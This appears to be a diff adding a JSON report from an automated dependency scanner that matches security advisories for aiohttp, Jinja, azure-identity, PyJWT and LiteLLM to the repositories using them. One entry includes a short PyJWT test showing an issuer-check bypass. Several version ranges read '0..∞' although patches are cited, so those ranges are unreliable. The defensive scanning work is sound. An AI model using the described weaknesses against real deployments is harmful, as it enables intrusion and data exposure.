+        "title": "AIOHTTP vulnerable to DoS through chunked messages",
+        "summary": "### Summary\n\nHandling of chunked messages can result in excessive blocking CPU usage when receiving a large number of chunks.\n\n### Impact\n\nIf an application makes use of the `request.read()` method in an endpoint, it may be possible for an attacker to cause the server to spend a moderate amount of blocking CPU time (e.g. 1 second) while processing the request. This could potentially lead to DoS as the server would be unable to handle other requests during that time.\n\n-----\n\nPatch: https://github.com/aio-libs/aiohttp/commit/dc3170b56904bdf814228fae70a5501a42a6c712\nPatch: https://github.com/aio-libs/aiohttp/commit/4ed97a4e46eaf61bd0f05063245f613469700229",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T16:03:16.385072Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "aiohttp"
+        ],
+        "affected_ranges": [
+          "0..3.13.3",
+          "0..∞"
+        ],
+        "references": [
+          "https://github.com/aio-libs/aiohttp/security/advisories/GHSA-g84x-mcqj-x9qq",
+          "https://nvd.nist.gov/vuln/detail/CVE-2025-69229",
+          "https://github.com/aio-libs/aiohttp/commit/4ed97a4e46eaf61bd0f05063245f613469700229",
+          "https://github.com/aio-libs/aiohttp/commit/dc3170b56904bdf814228fae70a5501a42a6c712",
+          "https://github.com/aio-libs/aiohttp",
+          "https://pypi.org/project/aiohttp",
+          "https://github.com/advisories/GHSA-g84x-mcqj-x9qq"
+        ]
+      },
+      "repo": "ianlintner/caretaker",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'aiohttp' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1472",
+        "source": "osv",
+        "title": "Jinja has a sandbox breakout through malicious filenames",
+        "summary": "A bug in the Jinja compiler allows an attacker that controls both the content and filename of a template to execute arbitrary Python code, regardless of if Jinja's sandbox is used.\n\nTo exploit the vulnerability, an attacker needs to control both the filename and the contents of a template. Whether that is the case depends on the type of application using Jinja. This vulnerability impacts users of applications which execute untrusted templates where the template author can also choose the template filename.",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T14:34:47.677447Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "jinja2"
+        ],
+        "affected_ranges": [
+          "0..3.1.5",
+          "3.0.0..∞"
+        ],
+        "references": [
+          "https://github.com/pallets/jinja/security/advisories/GHSA-gmj6-6f8f-6699",
+          "https://nvd.nist.gov/vuln/detail/CVE-2024-56201",
+          "https://github.com/pallets/jinja/issues/1792",
+          "https://github.com/pallets/jinja/commit/767b23617628419ae3709ccfb02f9602ae9fe51f",
+          "https://github.com/pallets/jinja",
+          "https://github.com/pallets/jinja/releases/tag/3.1.5",
+          "https://pypi.org/project/jinja2",
+          "https://github.com/advisories/GHSA-gmj6-6f8f-6699"
+        ]
+      },
+      "repo": "tiangolo/fastapi",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'jinja2' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1209",
+        "source": "osv",
+        "title": "Azure Identity Libraries and Microsoft Authentication Library Elevation of Privilege Vulnerability",
+        "summary": "Azure Identity Libraries and Microsoft Authentication Library Elevation of Privilege Vulnerability.",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T14:34:34.609113Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "azure-identity"
+        ],
+        "affected_ranges": [
+          "0..1.16.1",
+          "0..∞"
+        ],
+        "references": [
+          "https://nvd.nist.gov/vuln/detail/CVE-2024-35255",
+          "https://github.com/AzureAD/microsoft-authentication-library-for-dotnet/issues/4806#issuecomment-2178960340",
+          "https://github.com/Azure/azure-sdk-for-go/commit/50774cd9709905523136fb05e8c85a50e8984499",
+          "https://github.com/Azure/azure-sdk-for-java/commit/5bf020d6ea056de40e2738e3647a4e06f902c18d",
+          "https://github.com/Azure/azure-sdk-for-js/commit/c6aa75d312ae463e744163cedfd8fc480cc8d492",
+          "https://github.com/Azure/azure-sdk-for-net/commit/9279a4f38bf69b457cfb9b354f210e0a540a5c53",
+          "https://github.com/Azure/azure-sdk-for-python/commit/cb065acd7d0f957327dc4f02d1646d4e51a94178",
+          "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-35255",
+          "https://pypi.org/project/azure-identity",
+          "https://github.com/advisories/GHSA-m5vv-6r4h-3vj9"
+        ]
+      },
+      "repo": "ianlintner/caretaker",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'azure-identity' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1814",
+        "source": "osv",
+        "title": "PyJWT Issuer field partial matches allowed",
+        "summary": "### Summary\nThe wrong string if check is run for `iss` checking, resulting in `\"acb\"` being accepted for `\"_abc_\"`.\n\n### Details\nThis is a bug introduced in version [2.10.0](https://github.com/jpadilla/pyjwt/commit/1570e708672aa9036bc772476beae8bfa48f4131#diff-6893ad4a1c5a36b8af3028db8c8bc3b62418149843fc382faf901eaab008e380R366): checking the \"iss\" claim\nchanged from `isinstance(issuer, list)` to `isinstance(issuer,\nSequence)`.\n\n```diff\n-        if isinstance(issuer, list):\n+        if isinstance(issuer, Sequence):\n            if payload[\"iss\"] not in issuer:\n                raise InvalidIssuerError(\"Invalid issuer\")\n        else:\n```\n\nSince str is a Sequnce, but not a list, `in` is also used for string\ncomparison. This results in `if \"abc\" not in \"__abcd__\":` being\nchecked instead of `if \"abc\" != \"__abc__\":`.\n### PoC\nCheck out the unit tests added here: https://github.com/jpadilla/pyjwt-ghsa-75c5-xw7c-p5pm\n```python\n        issuer = \"urn:expected\"\n\n        payload = {\"iss\": \"urn:\"}\n\n        token = jwt.encode(payload, \"secret\")\n\n        # decode() succeeds, even though `\"urn:\" != \"urn:expected\". No exception is raised.\n        with pytest.raises(InvalidIssuerError):\n            jwt.decode(token, \"secret\", issuer=issuer, algorithms=[\"HS256\"])\n```\n\n\n### Impact\n\nI would say the real world impact is not that high, seeing as the signature still has to match. We should still fix it.\n",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T14:34:46.000573Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "pyjwt"
+        ],
+        "affected_ranges": [
+          "0..2.10.1",
+          "2.10.0..∞"
+        ],
+        "references": [
+          "https://github.com/jpadilla/pyjwt/security/advisories/GHSA-75c5-xw7c-p5pm",
+          "https://nvd.nist.gov/vuln/detail/CVE-2024-53861",
+          "https://github.com/jpadilla/pyjwt/commit/1570e708672aa9036bc772476beae8bfa48f4131#diff-6893ad4a1c5a36b8af3028db8c8bc3b62418149843fc382faf901eaab008e380R366",
+          "https://github.com/jpadilla/pyjwt/commit/33022c25525c1020869c71ce2a4109e44ae4ced1",
+          "https://github.com/jpadilla/pyjwt",
+          "https://pypi.org/project/pyjwt",
+          "https://github.com/advisories/GHSA-75c5-xw7c-p5pm"
+        ]
+      },
+      "repo": "ianlintner/caretaker",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'pyjwt' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1543",
+        "source": "osv",
+        "title": "LiteLLM Has a Leakage of Langfuse API Keys",
+        "summary": "In berriai/litellm version v1.52.1, an issue in proxy_server.py causes the leakage of Langfuse API keys when an error occurs while parsing team settings. This vulnerability exposes sensitive information, including langfuse_secret and langfuse_public_key, which can provide full access to the Langfuse project storing all requests.",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T14:34:58.666687Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "litellm"
+        ],
+        "affected_ranges": [
+          "0..∞"
+        ],
+        "references": [
+          "https://nvd.nist.gov/vuln/detail/CVE-2025-0330",
+          "https://github.com/BerriAI/litellm",
+          "https://huntr.com/bounties/661b388a-44d8-4ad5-862b-4dc5b80be30a",
+          "https://pypi.org/project/litellm",
+          "https://github.com/advisories/GHSA-879v-fggm-vxw2"
+        ]
+      },
+      "repo": "ianlintner/caretaker",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'litellm' named in advisory"
+    }
+  ],
+  "feed_counts": {
+    "nvd": 182,
+    "osv": 55,
+    "ghsa": 100
+  },
+  "repos_scanned": 9
+}
